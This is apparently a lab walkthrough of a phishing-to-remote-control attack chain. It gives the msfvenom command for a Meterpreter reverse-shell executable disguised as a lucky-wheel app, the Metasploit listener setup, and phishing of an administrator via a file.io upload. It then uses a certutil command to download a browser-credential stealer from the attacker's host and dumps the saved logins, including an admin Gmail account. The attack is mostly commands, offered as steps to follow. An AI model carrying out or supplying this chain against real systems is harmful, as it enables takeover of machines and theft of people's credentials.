# PHISHING AND RCE

## Setup
**PayLoad**: _**msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.31.130 LPORT 4444 -o/home/iu/Desktop/VongQuayMayMan.exe**_

- **msfvenom**: use the Metasploit tool to create a payload.
- **-p windows/meterpreter/reverse_tcp**: use tcp to listen.
- **LHOST=192.168.31.130**: the IP of the attacker machine used to listen.
- **LPORT=4444**: open any port to listen
- **/home/iu/Desktop/VongQuayMayMan.exe**: name of the malware file and the path containing the file

<img width="577" height="87" alt="image" src="https://github.com/user-attachments/assets/963ea332-70bb-4127-bde1-f9f77b55048a" />

Use the command **msfconsole** to open the Metasploit tool.

<img width="414" height="147" alt="image" src="https://github.com/user-attachments/assets/7c45771c-4836-4894-937e-bef1ce9c4843" />

Syntax to listen for the Victim machine.

<img width="499" height="155" alt="image" src="https://github.com/user-attachments/assets/bc21180e-127c-46ee-b245-3ad4315a0b7a" />

- **use multi/handler**: Used to load the multi/handler module.
- **set payload windows/meterpreter/reverse_tcp**: Use TCP to listen for the reverse connection.
- **set LHOST 192.168.31.130**: The IP address of the attacker machine used to listen. It must match the IP used when creating the payload in the previous step.
- **set LPORT 4444**: The port on the attacker machine used to listen. It must match the port used when creating the payload in the previous step.

Access the link and select Upload file to proceed with uploading the file and carry out phishing to the administrator's machine: _**https://www.file.io/**_

<img width="347" height="343" alt="image" src="https://github.com/user-attachments/assets/ee701ded-8ef2-4773-80e2-251391c13fb1" />

**PHISHING TO VICTIM**

<img width="604" height="106" alt="image" src="https://github.com/user-attachments/assets/b6f8c1a9-22f1-4349-8daa-4e22c007a4a0" />

After that, the administrator **downloads** the file to their computer and **runs the application**, which results in **the computer being taken over**.

<img width="224" height="22" alt="image" src="https://github.com/user-attachments/assets/e3ed983e-e300-4a4f-af54-c84454d0b1d8" />

The attacker has **gained full control of the administrator’s computer**.

<img width="583" height="163" alt="image" src="https://github.com/user-attachments/assets/1cfde400-d02b-4579-ad8f-bc04693ae198" />

**Proceed to exploit the accounts on the mail server.**

- Users tend to save their accounts on web browsers, so we proceed to find a tool to scan the accounts stored in the user's web browser.
- Use the BrowserCollector tool to dump all account information stored in the victim’s browser.
- **Syntax**: python3 -m http.server 9000

<img width="419" height="110" alt="image" src="https://github.com/user-attachments/assets/e9647783-0fe1-4822-92b9-67a102347633" />

- **python3**: Specifies the use of the Python programming language.
- **-m http.server**: Uses the http.server module to create a server.
- **9000**: The port that is opened on the server.

Access the administrator’s **shell** to **download the file to the machine**.

<img width="372" height="117" alt="image" src="https://github.com/user-attachments/assets/2c8a5815-cdb1-4543-a7f4-11a8ac422562" />

Proceed to **install** the file and **dump** the data stored in the victim’s browser.

_**certutil.exe-urlcache -f http://192.168.31.130:9000/BrowserCollector_x86.exe  Stealer.exe**_

<img width="625" height="88" alt="image" src="https://github.com/user-attachments/assets/a9ae44c1-0b2c-4429-8297-c1a71564f716" />

- **-f http://192.168.31.130:9000/BrowserCollector_x86.exe** :The address that contains the file to be transferred (in this case, the IP address of the attacker machine).
- **Browser.exe**: The name of the file saved on the target machine (the victim’s computer).

Proceed to **dump** the login accounts that are stored in the web browser.

Command used: _**.\Browser.exe all**_

<img width="529" height="125" alt="image" src="https://github.com/user-attachments/assets/ccfc5fbf-448c-46e5-8738-c400cc2b0e8d" />

- **.\Browser.exe**: Run the tool.
- **all**: Retrieve all available information stored in the browser.

**Login account Admin Gmail**

<img width="453" height="504" alt="image" src="https://github.com/user-attachments/assets/15a4450b-8393-4119-b2dc-63f80cce6829" />

<img width="374" height="415" alt="image" src="https://github.com/user-attachments/assets/cf420547-1918-437a-a86f-e2df53e35e7c" />

<img width="596" height="264" alt="image" src="https://github.com/user-attachments/assets/47fcc4ec-b8f6-4457-8b26-f38e2ca28d6d" />






